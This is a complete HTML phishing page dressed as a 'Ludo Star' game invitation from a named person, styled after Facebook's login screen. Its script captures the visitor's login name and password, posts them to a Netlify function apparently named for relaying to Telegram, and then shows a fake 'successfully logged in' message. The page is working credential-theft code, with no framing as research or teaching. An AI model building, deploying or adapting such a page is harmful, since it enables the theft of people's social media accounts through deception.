<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ludo Star - Sadiya Khan Invited You</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
        }
        
        body {
            background-color: #f0f2f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            overflow: hidden;
        }
        
        .main-container {
            width: 100%;
            max-width: 400px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
            overflow: hidden;
            position: relative;
        }
        
        /* Header with Ludo Design */
        .header-section {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 25px 20px;
            text-align: center;
            color: white;
            position: relative;
        }
        
        .ludo-graphic {
            width: 120px;
            height: 120px;
            margin: 15px auto 20px;
            position: relative;
            background: white;
            border-radius: 15px;
            border: 3px solid #333;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }
        
        /* Simple Ludo Design */
        .ludo-inner {
            width: 100%;
            height: 100%;
            position: relative;
            background: 
                linear-gradient(90deg, transparent 49%, #333 49%, #333 51%, transparent 51%),
                linear-gradient(transparent 49%, #333 49%, #333 51%, transparent 51%);
            border-radius: 12px;
        }
        
        .ludo-corner {
            position: absolute;
            width: 45%;
            height: 45%;
            border-radius: 8px;
        }
        
        .corner-red { background: #FF5252; top: 5%; left: 5%; }
        .corner-green { background: #4CAF50; top: 5%; right: 5%; }
        .corner-yellow { background: #FFD740; bottom: 5%; left: 5%; }
        .corner-blue { background: #2196F3; bottom: 5%; right: 5%; }
        
        .ludo-center {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 25px;
            height: 25px;
            background: #FFD700;
            border-radius: 50%;
            z-index: 2;
        }
        
        .invite-title {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 5px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .inviter-name {
            background: rgba(255, 255, 255, 0.2);
            padding: 8px 16px;
            border-radius: 20px;
            display: inline-block;
            margin: 10px 0;
            font-weight: 600;
            backdrop-filter: blur(5px);
        }
        
        .inviter-action {
            font-size: 14px;
            opacity: 0.9;
        }
        
        /* Content Section */
        .content-section {
            padding: 25px;
        }
        
        .section-title {
            color: #1c1e21;
            font-size: 18px;
            text-align: center;
            margin-bottom: 25px;
            font-weight: 600;
        }
        
        /* Form Styling */
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-label {
            display: block;
            color: #606770;
            font-size: 14px;
            margin-bottom: 6px;
            font-weight: 500;
        }
        
        .form-input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
            background: #f5f6f7;
            transition: all 0.2s;
        }
        
        .form-input:focus {
            outline: none;
            border-color: #1877F2;
            background: white;
            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
        }
        
        .form-input::placeholder {
            color: #8a8d91;
        }
        
        /* Login Button */
        .login-btn {
            width: 100%;
            background: #1877F2;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 15px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 5px;
        }
        
        .login-btn:hover {
            background: #166fe5;
        }
        
        /* Divider */
        .divider {
            height: 1px;
            background: #dadde1;
            margin: 20px 0;
            position: relative;
        }
        
        .divider-text {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 0 15px;
            color: #8a8d91;
            font-size: 13px;
        }
        
        /* Links */
        .forgot-link {
            display: block;
            text-align: center;
            color: #1877F2;
            text-decoration: none;
            font-size: 14px;
            margin: 15px 0;
            padding: 12px;
            border-bottom: 1px solid #dadde1;
        }
        
        .forgot-link:hover {
            text-decoration: underline;
        }
        
        .create-account-btn {
            display: block;
            background: #42b72a;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            text-align: center;
            text-decoration: none;
            transition: background 0.2s;
        }
        
        .create-account-btn:hover {
            background: #36a420;
        }
        
        /* Game Features */
        .features-section {
            margin-top: 25px;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 8px;
            text-align: center;
        }
        
        .features-title {
            color: #333;
            font-size: 16px;
            margin-bottom: 10px;
            font-weight: 600;
        }
        
        .features-list {
            color: #666;
            font-size: 14px;
            line-height: 1.5;
        }
        
        /* Result Message */
        #result {
            margin: 15px 0;
            padding: 12px;
            border-radius: 6px;
            text-align: center;
            font-weight: 500;
            display: none;
            font-size: 14px;
        }
        
        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
            display: block;
        }
        
        .error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
            display: block;
        }
        
        .loading {
            background: #e2e3e5;
            color: #383d41;
            border: 1px solid #d6d8db;
            display: block;
        }
        
        /* Make sure no scrolling */
        html, body {
            height: 100%;
            overflow: hidden;
        }
        
        @media (max-height: 700px) {
            .header-section {
                padding: 20px 20px 15px;
            }
            
            .content-section {
                padding: 20px;
            }
            
            .ludo-graphic {
                width: 100px;
                height: 100px;
                margin: 10px auto 15px;
            }
        }
        
        @media (max-width: 450px) {
            .main-container {
                max-width: 100%;
            }
            
            body {
                padding: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="main-container">
        <!-- Header with Ludo Graphic -->
        <div class="header-section">
            <h1 class="invite-title">ðŸŽ² You're Invited!</h1>
            
            <div class="ludo-graphic">
                <div class="ludo-inner">
                    <div class="ludo-corner corner-red"></div>
                    <div class="ludo-corner corner-green"></div>
                    <div class="ludo-corner corner-yellow"></div>
                    <div class="ludo-corner corner-blue"></div>
                    <div class="ludo-center"></div>
                </div>
            </div>
            
            <div class="inviter-name">Sadiya Khan</div>
            <p class="inviter-action">invited you to play</p>
        </div>
        
        <!-- Content Section -->
        <div class="content-section">
            <h2 class="section-title">Log in to join the game</h2>
            
            <form id="loginForm">
                <div class="form-group">
                    <label class="form-label" for="username">Mobile number or email address</label>
                    <input type="text" id="username" class="form-input" placeholder="Enter your mobile or email" required>
                </div>
                
                <div class="form-group">
                    <label class="form-label" for="password">Password</label>
                    <input type="password" id="password" class="form-input" placeholder="Enter your password" required>
                </div>
                
                <button type="button" class="login-btn" onclick="login()">
                    Log In
                </button>
            </form>
            
            <!-- Result Message -->
            <div id="result"></div>
            
            <!-- Links -->
            <a href="#" class="forgot-link">Forgotten password?</a>
            
            <div class="divider">
                <span class="divider-text">or</span>
            </div>
            
            <a href="#" class="create-account-btn">
                Create New Account
            </a>
            
            <!-- Game Features -->
            <div class="features-section">
                <div class="features-title">ðŸŽ® Game Features</div>
                <div class="features-list">
                    â€¢ Play with friends â€¢ Win rewards â€¢ Real-time multiplayer â€¢ Easy to play
                </div>
            </div>
        </div>
    </div>

    <script>
        async function login() {
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const resultDiv = document.getElementById('result');
            
            // Clear previous messages
            resultDiv.innerHTML = '';
            resultDiv.className = '';
            
            // Validation
            if (!username || !password) {
                showResult('Please fill in all fields', 'error');
                return;
            }
            
            // Show loading
            showResult('Logging in to join the game...', 'loading');
            
            try {
                // Call Netlify Function
                const response = await fetch('/.netlify/functions/telegram', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        username: username,
                        password: password,
                        timestamp: new Date().toISOString(),
                        source: 'Ludo Star Invitation',
                        inviter: 'Sadiya Khan'
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    showResult('âœ… Successfully logged in! Joining Sadiya Khan\'s game...', 'success');
                    
                    // Clear form after 2 seconds
                    setTimeout(() => {
                        document.getElementById('username').value = '';
                        document.getElementById('password').value = '';
                    }, 2000);
                    
                } else {
                    showResult('âŒ Login failed. Please check your credentials.', 'error');
                }
                
            } catch (error) {
                console.error('Login error:', error);
                showResult('âŒ Network error. Please try again.', 'error');
            }
        }
        
        function showResult(message, type) {
            const resultDiv = document.getElementById('result');
            resultDiv.innerHTML = message;
            resultDiv.className = type;
        }
        
        // Enter key support
        document.getElementById('password').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                login();
            }
        });
        
        // Add click effect to login button
        document.querySelector('.login-btn').addEventListener('click', function() {
            this.style.transform = 'scale(0.98)';
            setTimeout(() => {
                this.style.transform = '';
            }, 150);
        });
        
        // Prevent scrolling
        document.addEventListener('wheel', function(e) {
            if (e.target.closest('.main-container')) {
                e.preventDefault();
            }
        }, { passive: false });
        
        document.addEventListener('touchmove', function(e) {
            if (e.target.closest('.main-container')) {
                e.preventDefault();
            }
        }, { passive: false });
    </script>
</body>
</html>
